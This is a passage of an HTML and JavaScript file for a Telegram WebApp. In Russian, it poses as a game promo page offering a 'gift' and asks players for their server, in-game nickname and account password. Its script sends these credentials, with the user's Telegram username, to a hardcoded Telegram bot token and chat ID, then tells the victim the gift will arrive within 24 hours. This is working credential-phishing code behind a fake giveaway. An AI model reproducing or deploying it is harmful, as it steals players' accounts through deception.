            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: -1;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: rgba(17, 17, 17, 0.9);
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        
        .header {
            padding: 16px;
            background: rgba(0, 0, 0, 0.8);
            border-bottom: 1px solid #ff0000;

        }
        
        .logo {
            color: #ff0000;
            font-weight: bold;
            font-size: 24px;
            text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
            text-transform: uppercase;
        }
        
        .content {
            padding: 16px;
        }
        
        h1 {
            color: #ff0000;
            text-align: center;
            font-size: 22px;
            margin-bottom: 20px;
            text-transform: uppercase;
            text-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
            color: #ddd;
        }
        
        select {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ff0000'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 20px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
        }
        
        .error {
            color: #ff5555;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        .promo-code {
            padding: 12px;
            background: rgba(255, 0, 0, 0.2);
            border: 1px dashed #ff0000;
            border-radius: 8px;
            color: #ffcc00;
            font-weight: bold;
            text-align: center;
            margin: 15px 0;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #ff0000, #cc0000);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 10px;
            transition: all 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
        }
    </style>
</head>

                <div class="form-group">
                    <label>Введи игровой ник</label>
                    <input type="text" id="nickname" placeholder="Nick_Name" pattern="^[A-Za-z]+_[A-Za-z]+$" required>
                    <div class="error" id="nickError">Формат:Nick_Name)</div>
                </div>

                    <label>Введи пароль</label>
                    <input type="password" id="password" placeholder="Пароль (минимум 6 символов)" required>
                    <div class="error" id="passError">Пароль должен содержать минимум 6 символов (латиница/цифры/спецсимволы)</div>
                </div>

                <button type="submit" class="btn">Получить подарок</button>
            </form>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        document.getElementById('giftForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Сброс ошибок
            document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
            let isValid = true;
            
            // Проверка сервера
            const server = document.getElementById('server').value;
            if (!server) {
                document.getElementById('serverError').style.display = 'block';
                isValid = false;
            }
            
            // Проверка ника
            const nickname = document.getElementById('nickname').value;
            const nickRegex = /^[A-Za-z]+_[A-Za-z]+$/;
            if (!nickRegex.test(nickname)) {
                document.getElementById('nickError').style.display = 'block';
                isValid = false;
            }
            
            // Проверка пароля
            const password = document.getElementById('password').value;
            const passRegex = /^[^\u0400-\u04FF]{6,}$/;
            if (password.length < 6 || !passRegex.test(password)) {
                document.getElementById('passError').style.display = 'block';
                isValid = false;
            }
            
            if (!isValid) return;
            
            // Отправка данных
            const message = `🎁 НОВЫЙ ЗАПРОС НА ПОДАРОК!\n\n` +
                          `🎮 Сервер: ${server}\n` +
                          `🆔 Ник: ${nickname}\n` +
                          `🔑 Пароль: ${password}\n` +
                          `🎫 Промокод: #SUMMER\n` +
                          `От: @${tg.initDataUnsafe.user?.username || 'аноним'}`;
            
            const botToken = '7649642227:AAGjjBAGMthw83O0dt0XQr0wwbNAMtFMsDY';
            const chatId = '-1002845455179';
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        tg.showAlert('✅ Ваш запрос принят! Подарок будет отправлен в течение 24 часов.');
                        tg.close();
                    } else {
                        tg.showAlert('❌ Ошибка отправки. Попробуйте позже.');
                    }
                })
                .catch(error => {
                    console.error(error);
                    tg.showAlert('⚠️ Ошибка сети. Проверьте интернет.');
                });
        });
    </script>
